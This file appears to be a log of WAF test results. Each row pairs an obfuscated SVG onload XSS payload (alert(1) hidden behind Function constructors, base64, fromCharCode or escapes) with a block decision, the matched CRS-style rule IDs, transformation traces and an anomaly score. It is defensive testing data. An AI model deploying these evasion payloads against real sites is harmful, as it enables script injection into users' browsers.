2730,"<svg onload=""this.remove();(new(top.Function)(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,43v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826964271.815963
2731,"<svg onload=""this.remove();(parent.Function(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826964527.953062
2732,"<svg onload=""this.remove();(frames.Function(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826964785.945242
2734,"<svg onload=""this.remove();(new(globalThis.Function)(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,50v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826965187.550257
2786,"<svg onload='top[""Function""](""al""+""er""+""t(1)"")()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,32v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,56t:urlDecodeUni,t:compressWhitespace || ",25,177826977228.894244
2791,"<svg onload='(function(){return this})()[""al""+""ert""](1)'></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,42v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || o14,11v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826978364.451070
2798,"<svg onload='Function(atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,4,"941100,941120,941160,949110","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826980082.668896
2799,"<svg onload='(function(){this[""ev\u0061l""](atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,17v217,76t:urlDecodeUni,t:compressWhitespace || ",25,177826980256.724498
2800,"<svg onload='(function(){window[""Function""](atob(""YWxlcnQoMSk=""))()})()'></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,58v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177826980592.292113
2801,"<svg onload='(function(){[][""constructor""][""constructor""](atob(""YWxlcnQoMSk=""))()})()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,72v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826980767.028427
2802,"<svg onload='(function(){top[""\x65val""](atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,7,"932105,934100,941100,941120,941160,941370,949110","o22,6v217,73 || o14,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,14v217,73t:urlDecodeUni,t:compressWhitespace || ",30,177826981067.318223
2804,"<svg onload='(()=>globalThis.Function(atob(""YWxlcnQoMSk=""))())()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826981447.677119
2809,"<svg onload='(()=>{with(window)Function(atob(""YWxlcnQoMSk=""))()})()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826982629.190138
2813,"<svg onload='(()=>{Reflect.construct(Function,[atob(""YWxlcnQoMSk="")])()})()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826983593.699213
2815,"<svg onload='(()=>{Reflect.apply(Function,null,[atob(""YWxlcnQoMSk="")])()})()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826984034.766841
2818,"<svg onload='(function(){var b=[""ale""+""rt""];window[b[0]](1)})()'>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o50,13v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,65 || o14,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,11v217,65t:urlDecodeUni,t:compressWhitespace || ",35,177826984752.486437
2819,"<svg onload='(function(){var c=String.fromCharCode(97,108,101,114,116);window[c](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o77,10v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177826984958.150890
2820,"<svg onload='(function(){var d=atob(""YWxlcnQ="");window[d](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o54,10v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,9v217,66t:urlDecodeUni,t:compressWhitespace || ",30,177826985141.494315
2821,"<svg onload='(function(){var e=""a\u006c\u0065\u0072\u0074"";window[e](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o65,10v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826985418.973882
2824,"<svg onload='(function(){var h=""al""+""er""+""t"";top[h](1)})()'>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o44,4v217,60 || o48,10v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,60 || o14,11v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,6v217,60t:urlDecodeUni,t:compressWhitespace || ",40,177826986092.528943
2825,"<svg onload='(function(){var i=[""a"",""l"",""e"",""r"",""t""].join("""");window[i](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,10v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,9v217,80t:urlDecodeUni,t:compressWhitespace || ",30,177826986319.434499
2827,"<svg onload='(function(){var k=atob(""YWxlcnQ"");self[k](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,10v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,7v217,63t:urlDecodeUni,t:compressWhitespace || ",30,177826986715.159363
2828,"<svg onload='(function(){var m=`${""a""}${""l""}${""e""}${""r""}${""t""}`;window[m](1)})()'>",0,1,block,8,"932130,933210,934100,941100,941120,941160,941370,949110","o31,35v217,82t:urlDecodeUni,t:cmdLine || o70,10v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,9v217,82t:urlDecodeUni,t:compressWhitespace || ",35,177826987057.419858
2829,"<svg onload='(function(){var n=""a"".concat(""l"",""e"",""r"",""t"");window[n](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o65,10v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826987299.195096
2831,"<svg onload='(function(){var q=[""ale""+""rt""];top[q[0]](1)})()'>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o43,4v217,62 || o47,13v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,62 || o14,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,8v217,62t:urlDecodeUni,t:compressWhitespace || ",40,17782698775.826769
2832,"<svg onload='(function(){var r=String[""fromCharCode""](97,108,101,114,116);self[r](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,51v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o74,7v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826987975.695766
2833,"<svg onload='(function(){var s=[""al"",""ert""].join``;window[s](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o57,10v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,9v217,69t:urlDecodeUni,t:compressWhitespace || ",30,177826988171.401486
2836,<svg onload='(function(){var w=atob`YWxlcnQ`;window[w](1)})()'>,0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,10v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v217,63t:urlDecodeUni,t:compressWhitespace || ",30,177826988813.869874
2837,"<svg onload='(function(){var x=[""a""+""l""+""e""+""r""+""t""][0];window[x](1)})()'>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o62,10v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,74 || o14,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,74t:urlDecodeUni,t:compressWhitespace || ",35,177826989070.690272
2840,"<svg onload='(function(){var s=String;var f=s.fromCharCode;this[f(101,118,97,108)](f(97,108,101,114,116,40,49,41))})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,23v217,120t:urlDecodeUni,t:compressWhitespace || ",25,177826989740.321939
2841,"<svg onload='(()=>{const b=atob(""YWxlcnQoMSk="");Function(b)()})()'>",0,1,block,5,"933210,941100,941120,941160,949110","o56,9v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826989990.455402
2842,"<svg onload='(function(){var a=[String.fromCharCode(97),String.fromCharCode(108),String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)].join("""");window[a](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o172,10v217,184t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,184 || v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o166,9v217,184t:urlDecodeUni,t:compressWhitespace || ",30,177826990237.095690
2843,"<svg onload='(function(){var g=globalThis;var c=g.String.fromCharCode;g[c(101,118,97,108)](c(97,108,101,114,116,40,49,41))})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826990493.449778
2848,"<svg onload='(function(){var h=top;var i=h.String;var j=i.fromCharCode;h[j(101,118,97,108)](j(97,108,101,114,116,40,49,41))})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826991695.047675
2850,"<svg onload='(function(){var n=self;var o=n.String;var r=o[""from""+""CharCode""];n[r(101)+r(118)+r(97)+r(108)](r(97,108,101,114,116,40,49,41))})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o79,64v217,145t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,145 || o14,11v217,145t:urlDecodeUni || v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826992056.317817
2853,"<svg onload='(()=>{let arr=[...atob(""YWxlcnQ="")].map(c=>c.charCodeAt());Function(String.fromCharCode(...arr,40,49,41))()})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o81,19v217,126 || v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826992832.196862
2854,"<svg onload='(function(){var b1=String;var b2=b1[""fromCha""+""rCode""];this[b2(0x65,0x76,0x61,0x6c)](b2(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))})()'>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,148 || o14,11v217,148t:urlDecodeUni || v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o68,29v217,148t:urlDecodeUni,t:compressWhitespace || ",30,177826993173.475603
2856,"<svg onload='(function(){var d1=[].constructor.constructor;var d2=String.fromCharCode;d1(d2(97,108,101,114,116,40,49,41))()})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826993654.820054
2864,"<svg onload='(function(){var i=self[atob(""U3RyaW5n"")][atob(""ZnJvbUNoYXJDb2Rl"")];self[i(97,108,101,114,116)](1)})()'/>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,22v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177826995410.395444
2867,"<svg onload='(function(){var o=globalThis[""S""+""tring""][""from""+""CharCode""];globalThis[o(97,108,101,114,116)](1)})()'/>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,117 || o14,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826996286.709943
2870,"<svg onload='(function(){var s=parent[""\u0053\u0074\u0072\u0069\u006e\u0067""][""\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065""];parent[s(97)+s(108)+s(101)+s(114)+s(116)](1)})()'/>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o160,42v217,205t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,205 || o14,11v217,205t:urlDecodeUni || v217,205t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,205t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,205t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17782699692.399592
2897,"<svg onload='requestAnimationFrame(()=>globalThis.Function(""al""+""ert(1)"")())'>",0,1,block,5,"933210,941100,941120,941160,949110","o58,18v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827003398.803966
2921,"<svg onload='(new/**/(self.Function)/**/(atob(""cmV0dXJuIGFsZXJ0"")))/**/()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,54v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827008953.133009
2923,"<svg onload='(new{a:Function}[""a""](""ret""+""urn ale""+""rt""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o29,33v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827009410.984541
